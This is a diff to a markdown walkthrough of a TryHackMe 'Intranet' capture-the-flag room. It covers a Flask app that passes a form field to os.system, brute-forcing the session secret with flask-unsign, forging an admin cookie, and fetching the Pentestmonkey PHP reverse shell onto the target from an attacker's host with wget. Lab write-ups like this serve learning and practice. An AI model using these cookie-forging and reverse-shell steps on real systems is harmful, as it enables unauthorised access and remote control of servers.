@@ -418,10 +418,12 @@ crunch: 100% completed generating output
 
 <br>
 <br>
+<p> 1.3. What is the third web application flag?</em>.<br>
+<code>THM{******************************}</code></p>
 <p>
 
-- key = secret_key_ + ######<br>
-- ###### = str(random.randrange(100000,999999)<br>
+- key : secret_key_ + ######<br>
+- ###### : str(random.randrange(100000,999999)<br>
 - if session.get(&#34;username&#34;) == &#34;admin&#34;:<br>if request.method == &#34;POST&#34;:<br>os.system(request.form[&#34;debug&#34;])<br>return render_template(&#34;admin.html&#34;)</p>
 
 ```bash
@@ -618,13 +620,14 @@ if __name__ == &#34;__main__&#34;:
         app.run(host=&#34;0.0.0.0&#34;, port=8080, debug=False)
 ```
 
+<br>
 <h2>Flask Installation</h2>
 
 ```bash
 (rosana) :~/Intranet# sudo pip3 install flask-unsign
 ```
 
-<h2><code>mylist.txt</code> . 100000 to 999999</h2>
+<h2>Wordlist . 100000 to 999999 . mylist.txt</h2>
 
 ```bash
 (rosana) :~/Intranet for i in $(seq 100000 999999); do echo "secret_key_$i"; done > mylist.txt
@@ -638,7 +641,7 @@ secret_key_999998
 secret_key_999999
 ```
 
-<h2>JWT from current session . <code>sessioncookie.txt</code></h2>
+<h2>JWT from current session . sessioncookie.txt</h2>
 
 ```bash
 (rosana) :~/Intranet# echo 'eyJsb2dnZWRfaW4iOnRyd********************W5kZXJzIn0.aLDGKA.1smTdr1kBmdozdXsABbPohXWavc' > sessioncookie.txt
@@ -654,7 +657,7 @@ secret_key_999999
 'secret_key_xxxxxx'
 ```
 
-<h2>JWT for admin´s session</h2>
+<h2>JWT to enable admin´s session</h2>
 
 ```bash
 (rosana) :~/Intranet# flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret "secret_key_xxxxxx"
@@ -668,12 +671,6 @@ eyJsb2dnZWRfaW4iOn*************************Q.aLDTWw.anr8hkKuMLBVnG5L3pAfLTtUdtA
 - refreshed</p>
 
 <img width="1267" height="342" alt="image" src="https://github.com/user-attachments/assets/9ffe43dd-c7d7-4a78-a763-e8de0f6fc487" />
-
-<br>
-<br>
-<p> 1.3. What is the third web application flag?</em>.<br>
-<code>THM{******************************}</code></p>
-
 
 <br>
 <br>
@@ -746,7 +743,6 @@ THM{*****************************}
 
 <br>
 <h2>ps aux</h2>
-
 <p>
 
 - /usr/sbin/apache2 -k start</p>
@@ -777,10 +773,14 @@ drwxr-xr-x 3 root root 4.0K Oct 16  2022 ..
 
 <p>
 
-- Pentestmonkey PHP Reverse Shell</p>
+-  <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php">Pentest Monkey PHP Reverse Shell</a></p>
 
 ```bash
 (rosana) :~/Intranet# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
+```
+
+```bash
+(rosana) :~/Intranet# mv php-reverse-shell.php r.php
 ```
 
 ```bash
@@ -789,7 +789,7 @@ devops@...:/var/www/html$ wget http://xx.xxx.xxx.xxx:8000/r.php
 
 <p>
   
-- http://10.201.1.1323/r.php</p>
+- intranet.thm/r.php</p>
 
 
 ```bash
